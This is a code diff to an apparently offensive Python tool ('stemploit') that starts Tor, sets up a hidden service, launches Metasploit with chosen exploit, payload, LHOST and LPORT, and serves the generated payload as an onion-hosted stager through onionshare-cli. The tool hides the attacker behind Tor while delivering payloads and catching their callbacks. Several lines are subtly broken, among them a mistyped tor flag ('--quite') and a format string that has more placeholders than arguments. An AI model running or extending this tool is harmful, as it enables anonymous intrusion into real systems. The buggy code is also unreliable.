@@ -90,28 +90,43 @@ def generate_msfc_batch(exploit, payload, lhost, lport):
         subprocess.Popen(['xterm', '-e', 'msfconsole -q -r msfconsole.rc'])
 
 
-def generate_onionshare_stager():
-    try:
-        rc = subprocess.call(['which onionshare'])
-    except Exception as e:
-        rc = e
+def generate_onionshare_stager(outfile):
+    rc = subprocess.call(['which',  'onionshare-cli'], stdout=subprocess.PIPE)
+    if rc:
+        print('\n')
+        print('[!] Unable to find onionshare-cli ! Exiting...')
+        exit(0)
+    else:
+        # Start OnionShare FTP
+        print(' * Starting OnionShare solution...')
+        # os.system('onionshare-cli %s --public --website --disable_csp --receive --data-dir %s' % (outfile, ))
+        print('onionshare-cli %s --public --website --disable_csp --receive --data-dir %s' % outfile)
+        proc = subprocess.Popen(
+            args=['onionshare-cli', outfile, '--public', '--website', '--disable_csp'],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+            shell=True
+        )
+        state = proc.communicate(timeout=120)
+        stdout = proc.stderr.read() + proc.stdout.read()
+    # Give some time to start onionshare hidden webservice
+    time.sleep(120)
+
 
 
 def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost=None, output=None, onion_ftp=False):
     # Check if tor is installed
-    try:
-        rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
-    except Exception as e:
-        rc = e
+    rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
     if rc:
         print('\n')
-        print('[!] Unable to find tor! Exiting..')
+        print('[!] Unable to find tor! Exaiting..')
         exit(0)
     else:
         # Start tor
         print(' * Starting tor network..')
         os.system("service tor start")
-        os.system("tor --quiet &")
+        os.system('service tor restart')
+        os.system('nohup tor --quite &')
+        # os.system("tor --quiet &")
     # Give some time to start tor circuit.
     time.sleep(6)
     with Controller.from_port() as controller:
@@ -129,7 +144,7 @@ def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost
 
         # Check if onion_ftp is needed
         if onion_ftp:
-            generate_onionshare_stager()
+            generate_onionshare_stager(os.getcwd() + '/stemploitout')
         # The hostname is only available when we can read the hidden service
         # directory. This requires us to be running with the same user as tor process.
         if result.hostname:
@@ -176,15 +191,21 @@ def stemploit_main():
     print('\n')
     time.sleep(2)
     arguments = parse_arguments()
-    parameters_handler(
-        exploit=arguments.exploit,
-        payload=arguments.payload,
-        lport=arguments.local_port,
-        rport=arguments.remote_port,
-        lhost=arguments.local_host,
-        output=arguments.payload_outfile,
-        onion_ftp=arguments.onion_ftp
-    )
+    try:
+        parameters_handler(
+            exploit=arguments.exploit,
+            payload=arguments.payload,
+            lport=arguments.local_port,
+            rport=arguments.remote_port,
+            lhost=arguments.local_host,
+            output=arguments.payload_outfile,
+            onion_ftp=arguments.onion_ftp
+        )
+    except Exception as e:
+        print('\n')
+        print(colored('\t\v! Error occur !', 'red'))
+        print(colored(e.with_traceback(e.__traceback__), 'yellow'))
+        exit(0)
 
 
 if __name__ == '__main__':
